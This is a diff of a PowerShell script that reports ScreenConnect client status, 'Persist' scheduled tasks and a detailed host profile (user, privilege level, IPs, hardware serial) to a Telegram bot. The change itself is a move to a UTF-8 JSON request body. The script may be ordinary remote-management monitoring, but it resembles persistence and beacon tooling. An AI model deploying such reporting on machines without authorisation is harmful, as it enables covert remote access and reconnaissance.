@@ -1,5 +1,5 @@
 #Requires -Version 5.1
-# TG_REPORT BUILD 20260802T2 - rich ScreenConnect monitor Telegram alerts (HTML)
+# TG_REPORT BUILD 20260802T3 - rich SC alerts (HTML + UTF-8 JSON)
 param(
     [Parameter(Mandatory = $true)][string]$State,
     [Parameter(Mandatory = $true)][string]$Summary,
@@ -134,9 +134,9 @@ $trans = if ($OldState) { "$OldState -> $State" } else { $State }
 
 $scList = New-Object System.Collections.Generic.List[string]
 Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'ScreenConnect Client*' } | ForEach-Object {
-    [void]$scList.Add(('• <code>{0}</code>: <b>{1}</b>' -f (Esc $_.Name), (Esc ([string]$_.Status))))
+    [void]$scList.Add(('- <code>{0}</code>: <b>{1}</b>' -f (Esc $_.Name), (Esc ([string]$_.Status))))
 }
-if ($scList.Count -eq 0) { [void]$scList.Add('• (none)') }
+if ($scList.Count -eq 0) { [void]$scList.Add('- (none)') }
 
 $taskLines = New-Object System.Collections.Generic.List[string]
 foreach ($tn in @(
@@ -147,7 +147,7 @@ foreach ($tn in @(
     )) {
     schtasks.exe /Query /TN $tn /FO LIST 1>$null 2>$null
     $st = if ($LASTEXITCODE -eq 0) { 'present' } else { 'missing' }
-    [void]$taskLines.Add(('• <code>{0}</code>: {1}' -f (Esc $tn), $st))
+    [void]$taskLines.Add(('- <code>{0}</code>: {1}' -f (Esc $tn), $st))
 }
 
 $pub = Get-PublicIp
@@ -160,67 +160,72 @@ try {
 } catch {}
 
 $text = @"
-$emoji <b>SC Monitor — $(Esc $title)</b>
+$emoji <b>SC Monitor - $(Esc $title)</b>
 
 <b>Event</b>
-• Summary: $(Esc $Summary)
-• Transition: <code>$(Esc $trans)</code>
-• When: $(Esc $now)
+- Summary: $(Esc $Summary)
+- Transition: <code>$(Esc $trans)</code>
+- When: $(Esc $now)
 
 <b>Host</b>
-• Computer: <code>$(Esc $env:COMPUTERNAME)</code>
-• User: <code>$(Esc $who)</code>
-• Elevated: $elev | SYSTEM: $isSystem
-• Domain/Workgroup: $(Esc $os.Domain)
+- Computer: <code>$(Esc $env:COMPUTERNAME)</code>
+- User: <code>$(Esc $who)</code>
+- Elevated: $elev | SYSTEM: $isSystem
+- Domain/Workgroup: $(Esc $os.Domain)
 
 <b>Network</b>
-• LAN IPs: <code>$(Esc $lan)</code>
-• Public IP: <code>$(Esc $pub)</code>
+- LAN IPs: <code>$(Esc $lan)</code>
+- Public IP: <code>$(Esc $pub)</code>
 
 <b>OS / Hardware</b>
-• OS: $(Esc $os.Caption)
-• Version: $(Esc $os.Version) (build $(Esc $os.Build)) $(Esc $os.Arch)
-• Install: $(Esc $os.InstallDate) | Last boot: $(Esc $os.LastBoot)
-• Uptime: $(Esc $uptime)
-• CPU: $(Esc $os.CPU)
-• Hardware: $(Esc $os.Manufacturer) $(Esc $os.Model)
-• Serial: <code>$(Esc $os.Serial)</code>
-• RAM: $($os.TotalRAM_GB) GB
-• Disk C: $($os.DiskFree_GB) GB free / $($os.DiskSize_GB) GB
+- OS: $(Esc $os.Caption)
+- Version: $(Esc $os.Version) (build $(Esc $os.Build)) $(Esc $os.Arch)
+- Install: $(Esc $os.InstallDate) | Last boot: $(Esc $os.LastBoot)
+- Uptime: $(Esc $uptime)
+- CPU: $(Esc $os.CPU)
+- Hardware: $(Esc $os.Manufacturer) $(Esc $os.Model)
+- Serial: <code>$(Esc $os.Serial)</code>
+- RAM: $($os.TotalRAM_GB) GB
+- Disk C: $($os.DiskFree_GB) GB free / $($os.DiskSize_GB) GB
 
 <b>ScreenConnect</b>
-• Primary <code>5f6010579852e507</code>: $(Esc (Get-SvcLine $prim))
-• Alt <code>f861c8140d453427</code>: $(Esc (Get-SvcLine $alt))
-• All SC services:
+- Primary <code>5f6010579852e507</code>: $(Esc (Get-SvcLine $prim))
+- Alt <code>f861c8140d453427</code>: $(Esc (Get-SvcLine $alt))
+- All SC services:
 $($scList -join "`n")
 
 <b>Persist / Cache</b>
-• MSI cache: $(Esc $msiSize)
-• WorkDir: <code>$(Esc $WorkDir)</code>
-• Tasks:
+- MSI cache: $(Esc $msiSize)
+- WorkDir: <code>$(Esc $WorkDir)</code>
+- Tasks:
 $($taskLines -join "`n")
 
-<i>Bot: @nobuddyrmmBot • OWN_MON rich report</i>
+<i>Bot: @nobuddyrmmBot | OWN_MON rich report</i>
 "@
 
 $log = Join-Path $WorkDir 'boot.err'
-try {
-    Invoke-RestMethod -Uri ("https://api.telegram.org/bot$($cfg.BOT_TOKEN)/sendMessage") -Method Post -Body @{
+function Send-Tg([string]$msg, [string]$mode) {
+    $payload = @{
         chat_id                  = $cfg.CHAT_ID
-        text                     = $text
-        parse_mode               = 'HTML'
-        disable_web_page_preview = 'true'
-    } | Out-Null
+        text                     = $msg
+        disable_web_page_preview = $true
+    }
+    if ($mode) { $payload.parse_mode = $mode }
+    $json = $payload | ConvertTo-Json -Compress -Depth 5
+    # Force UTF-8 body so emoji survive (form-urlencoded mangles them)
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
+    Invoke-RestMethod -Uri ("https://api.telegram.org/bot$($cfg.BOT_TOKEN)/sendMessage") `
+        -Method Post -Body $bytes -ContentType 'application/json; charset=utf-8' | Out-Null
+}
+
+try {
+    Send-Tg -msg $text -mode 'HTML'
     Add-Content -LiteralPath $log -Value 'tg_sent_rich' -ErrorAction SilentlyContinue
 } catch {
     try {
         $plain = [regex]::Replace($text, '<[^>]+>', '')
         $plain = [System.Net.WebUtility]::HtmlDecode($plain)
-        Invoke-RestMethod -Uri ("https://api.telegram.org/bot$($cfg.BOT_TOKEN)/sendMessage") -Method Post -Body @{
-            chat_id                  = $cfg.CHAT_ID
-            text                     = $plain
-            disable_web_page_preview = 'true'
-        } | Out-Null
+        Send-Tg -msg $plain -mode ''
         Add-Content -LiteralPath $log -Value 'tg_sent_plain' -ErrorAction SilentlyContinue
     } catch {
         Add-Content -LiteralPath $log -Value ("tg_fail " + $_.Exception.Message) -ErrorAction SilentlyContinue
